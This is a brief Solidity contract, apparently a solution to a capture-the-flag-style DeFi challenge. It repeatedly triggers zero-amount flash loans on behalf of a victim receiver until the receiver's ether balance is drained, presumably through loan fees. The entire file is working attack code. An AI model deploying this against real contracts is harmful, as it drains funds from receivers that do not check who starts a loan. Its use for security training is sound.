// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

/**
 * @title AttackNaiveReceiver
 */
contract AttackNaiveReceiver {

    INaiveReceiverLenderPool lenderPool;
    
    constructor(address _pool) {
        lenderPool = INaiveReceiverLenderPool(_pool);
    }

    function run(address _borrower) public {
        
        while(address(_borrower).balance > 0){
            lenderPool.flashLoan(_borrower, 0);
        }

    }

}